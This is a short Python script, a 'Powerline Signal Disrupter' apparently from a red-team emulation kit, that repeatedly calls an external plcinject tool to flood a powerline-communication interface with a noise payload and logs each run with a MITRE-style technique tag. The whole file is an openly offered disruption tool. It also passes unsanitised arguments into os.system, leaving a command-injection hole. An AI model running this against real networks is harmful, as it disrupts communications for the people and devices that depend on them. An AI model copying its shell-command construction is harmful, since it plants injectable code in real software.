#!/usr/bin/env python3

import argparse
import os
import json
import time
from datetime import datetime

LOG_FILE = "results/powerline_disrupt_log.json"
MITRE_TTP = "T8140"

def log(entry):
    os.makedirs("results", exist_ok=True)
    try:
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    except:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def inject_noise(interface="eth0", pattern="0xFFFF", repeat=5):
    for _ in range(repeat):
        cmd = f"plc-utils/plcinject -i {interface} --payload {pattern}"
        os.system(cmd)
        time.sleep(1)

def main():
    parser = argparse.ArgumentParser(description="Powerline Signal Disrupter")
    parser.add_argument("--iface", default="eth0", help="PLC interface")
    parser.add_argument("--pattern", default="0xFFFF", help="Payload pattern")
    parser.add_argument("--repeat", type=int, default=5)
    args = parser.parse_args()

    inject_noise(args.iface, args.pattern, args.repeat)
    log({
        "timestamp": datetime.utcnow().isoformat(),
        "interface": args.iface,
        "pattern": args.pattern,
        "repeat": args.repeat,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
